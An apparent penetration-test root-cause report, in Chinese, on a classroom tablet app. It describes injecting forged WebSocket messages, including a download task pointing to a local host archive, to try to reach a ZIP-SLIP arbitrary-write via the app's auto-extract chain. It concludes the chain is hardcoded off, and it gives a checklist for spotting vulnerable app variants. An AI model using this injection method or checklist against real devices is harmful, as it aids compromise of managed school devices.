# 最终根因报告（FINAL ROOT CAUSE）

> 日期：2026-10-25 上午
> 结论：自动下载/解压链在本设备 App 变体上被**硬编码关闭**，且任务列表来自服务端 API。
> 状态：已用 WS 注入实测验证（ACK OK）+ 代码逐行确认。

---

## 一、实测过程（2026-10-25 08:56-09:02）

```
08:56  打开云课堂，进入真实老师课堂
       WS 8889 连接建立: syn=1, ws_open=1, frame_in=1

08:57  执行 inject_upclass_v2.py（完整信封: id/rt/tags/from 全对）
       INJ type=400 UP_CLASS(attendClass=2,setClassTime=true)   → ACK OK ✓
       INJ type=0  任务(zipUrl=http://192.168.137.1/lab2.7z)     → ACK OK ✓
       WS 统计: inject=11, frame_in=130, 多次 ACK OK

08:57-09:02  观察冒充器: 零新请求、无 [PAYLOAD-SERVE2]、无下载
       用户重进课堂/强制停止 App/重启平板后仍无下载
```

## 二、根因代码（决定性）

### 2.1 自动下载的触发条件（唯一入口）

```java
// AutoDownloadManager.checkPreDownload()  :733-765
public void checkPreDownload() {
    if (!UpClassStateHelper.isEndUpClass()        // ← 我们已能让它 = false
        && RoleJudgmentHelper.isBaiFenYunApp()) { // ← 硬编码 false！
        new GetPrepareTaskModel().getPrepareTask(new AutoDownloadManager$3(this));
    }
}

// RoleJudgmentHelper.isBaiFenYunApp()  :171-177
public boolean isBaiFenYunApp() {
    return false;                                  // const/4 v0, 0x0; return v0
}
```

**⇒ 条件 `!isEndUpClass() && false` 恒为 false ⇒ `getPrepareTask()` 永远不会被调用。**

### 2.2 即使条件通过，任务列表也不是我们能的

```java
// GetPrepareTaskModel.getPrepareTask()  :54
const-string v3, "/api/v1/classrooms/%s/desktop_backup/tasks"
sget-object v1, HttpRequest$RequestMethod;->GET
```

**⇒ 任务列表来自服务端 HTTPS 接口，我们通过 WS 注入的本地任务不会出现在该列表。**

### 2.3 唯一调用链

```
StudentDeskTopActivity:4822  checkPreDownload()
  → GetPrepareTaskModel.getPrepareTask()          ← 服务端 API (HTTPS)
  → AutoDownloadManager$3.onSuccess(List)          ← 服务端返回的列表
  → AutoDownloadManager.addDownloadTask(List)      ← 唯一的 addDownloadTask 调用者
  → addTaskList → startNextTask
  → ResourceHelper.downLoadResource(task)          ← 只有服务端任务才能到这里
  → Z7Extractor.extractFile                        ← ZIP-SLIP 入口
```

**⇒ 我们注入的本地任务无法进入 `onSuccess(List)` 的参数，因此永远到不了 addDownloadTask。**

## 三、这意味着什么

| 环节 | 状态 | 依据 |
|---|---|---|
| WS 注入能力 | ✅ 成功 | ACK OK，端侧确认 |
| 本地课堂状态设置 | ✅ 成功 | type=400 → UP_CLASS_STATE |
| 自动下载触发 | ❌ 硬编码关闭 | isBaiFenYunApp() return false |
| 任务列表来源 | ❌ 服务端 HTTPS | /api/v1/classrooms/%s/desktop_backup/tasks |
| Z7Extractor 解压 | ❌ 不可达 | 依赖自动下载 |
| ZIP-SLIP 任意写 | ❌ 不可达 | 依赖解压 |

## 四、为什么这是"设计决定"而不是"漏洞"

```
· 厂商把自动下载功能做成了 AB 版能力（百分云版才有）
· 本设备装的是非百分云版（学海/智通云版）
· 因此该功能被硬编码关闭，不是被策略限制
· 即使进入"上课中"状态，该版本也不会自动下载
```

## 五、可结论化的判断标准（对任何同类设备通用）

```
判断一台设备是否可能存在"自动下载→解压→任意写"链：
1. 检查 App 变体: RoleJudgmentHelper.isBaiFenYunApp() 的返回值
   - return true  → 该链存在（需课堂状态 = 上课中）
   - return false → 该链在设计上就不存在（本设备即此情况）
2. 检查任务列表来源: GetPrepareTaskModel 的接口
   - 服务端 API  → 只能由服务端推送触发
   - 本地 DB     → 可由注入任务触发（假设性，本 App 不满足）
```

## 六、最终结论

```
**在这台设备（非百分云版云课堂 App）上：
自动下载/解压/ZIP-SLIP 链在代码层面被硬编码关闭，
与课堂状态、令牌、注入能力均无关。**

本次尝试已证明：
  ✓ 我们能用 WS 消息设置本地课堂状态（这是真实的、可复用的能力）
  ✓ 我们定位了自动下载的真正开关（isBaiFenYunApp 硬编码 false）
  ✗ 但该开关决定了整条链在本 App 变体上不存在

⇒ 除非更换为百分云版 App（需安装能力，被 MDM 拦），
  否则这条链在本设备上无解 —— 这是证据支持的最终结论。
```

---

*配套材料：`FEASIBILITY-VERIFIED.md`（前期验证）、`tools/inject_upclass_v2.py`（注入器）、
`WALKTHROUGH.md`（链路走透文档）、`tools/full_chain_run.py`（一键脚本）。*
